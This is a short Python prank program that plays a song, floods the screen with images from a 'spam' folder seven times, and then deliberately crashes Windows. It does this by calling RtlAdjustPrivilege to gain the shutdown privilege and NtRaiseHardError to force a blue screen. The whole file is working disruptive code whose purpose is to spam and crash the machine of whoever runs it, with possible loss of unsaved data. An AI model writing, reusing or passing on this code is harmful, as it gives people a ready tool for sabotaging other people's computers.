#!/usr/bin/env python3
import os
import sys
import time
from pathlib import Path
import pygame
from PIL import Image
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref

def get_asset_path(relative_path):
    """ Get absolute path to resource, works for dev and for Nuitka/PyInstaller """
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    return Path(base_path) / relative_path

def main():
    if sys.platform.startswith('linux') and "SDL_AUDIODRIVER" not in os.environ:
        os.environ["SDL_AUDIODRIVER"] = "pulseaudio"

    try:
        pygame.mixer.init()
    except pygame.error as e:
        print(f"Audio init failed: {e}. Falling back to dummy driver.")
        os.environ["SDL_AUDIODRIVER"] = "dummy"
        pygame.mixer.init()

    song_path = get_asset_path("assets/we-are-charlie-kirk-song.mp3")
    spam_dir = get_asset_path("assets/spam")

    sound = pygame.mixer.Sound(str(song_path))
    sound.play()

    for _ in range(7):
        for i in spam_dir.iterdir():
            if i.suffix.lower() in ['.jpg']:
                im = Image.open(i)
                im.load()
                im.show()
                time.sleep(1)

    time.sleep(50)
    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
            c_uint(19),
            c_uint(1),
            c_uint(0),
            byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xc000007B),
        c_ulong(0),
        nullptr,
        nullptr,
        c_uint(6),
        byref(c_uint())
    )

if __name__ == "__main__":
    main()
